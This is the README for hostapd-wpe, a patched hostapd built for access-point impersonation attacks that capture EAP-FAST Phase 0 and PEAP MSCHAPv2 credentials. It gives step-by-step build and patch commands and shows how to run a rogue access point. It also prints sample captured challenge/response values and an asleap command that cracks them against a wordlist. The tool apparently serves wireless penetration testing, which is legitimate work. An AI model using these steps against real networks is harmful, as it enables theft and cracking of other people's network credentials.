hostapd-wpe (Wireless Pwnage Edition)

------------------------------------------

The current hostapd-wpe.patch is for: hostapd-1.0.tar.gz

hostapd-wpe is an extension of FreeRADIUS-WPE 
(http://www.willhackforsushi.com/?page_id=37) and JoMo-Kun's 
HostAP karma patch (http://www.foofus.net/?page_id=115). 

Since FreeRADIUS does not support EAP-FAST in a non-development
way, I decided to modify hostapd to facilitate AP impersonation 
attacks with EAP-FAST Phase 0. It'll also work with all of 
the Karma EAP-Types and more. 

Currently it supports:
	EAP-FAST (Phase 0)
	PEAP MSCHAPv2

TODO:
	Logging to file, test more EAP-Types 

Building 
---------

	hostapd does not support EAP-FAST out of the box. Instead you'll have 
	to install a OpenSSL version > 1.0.0 and apply the hostapd-wpe patch
	to make it all work. 

	hostapd-wpe is assumed to be in /root/hostapd-wpe if you put it 
	anywhere else, you'll need to change the config files, etc..

	git clone https://github.com/OpenSecurityResearch/hostapd-wpe 

	Here are the build steps for OpenSSL (on BT5R2):

	Note: This will overwrite any previous OpenSSL instances and may
	break things.. 

	wget https://www.openssl.org/source/openssl-1.0.1c.tar.gz
	tar -zxf openssl-1.0.1c.tar.gz
	cd openssl-1.0.1c
	./config --prefix=/usr --libdir=lib no-idea shared zlib enable-tlsext enable-rc5 enable-ssl2 enable-ssl3 enable-tls1
	make depend
	make
	make install

	Now apply the hostapd-wpe.patch:

	wget http://hostap.epitest.fi/releases/hostapd-1.0.tar.gz
	tar -zxf hostapd-1.0.tar.gz
	cd hostapd-1.0
	patch -p1 < /root/hostapd-wpe/hostapd-wpe.patch 
	make
	make install

	I copied the certs directory and scripts from FreeRADIUS to ease that 
	portion of things. You should just be able to:

	cd /root/hostapd-wpe/certs
	./bootstrap


Running:
----------------

	With all of that complete, you can run hostapd. When testing, use either
	hostapd-local-eapfast.conf or hostapd-local-peap.conf which will
	create an AP and output the credentials. For instance:

	hostapd -d ~/hostapd-wpe/hostapd-local-eapfast.conf

	Look in the output for the username/challenge/response. I'll add
	file logging soon. 

	for instance here are the EAP-FAST Phase 0 creds from stdout:

	username: jdslfkjs
	challenge: bc:87:6c:48:37:d3:92:6e
	response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0

	and as always, we feed them into asleap to crack:

	# asleap -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist
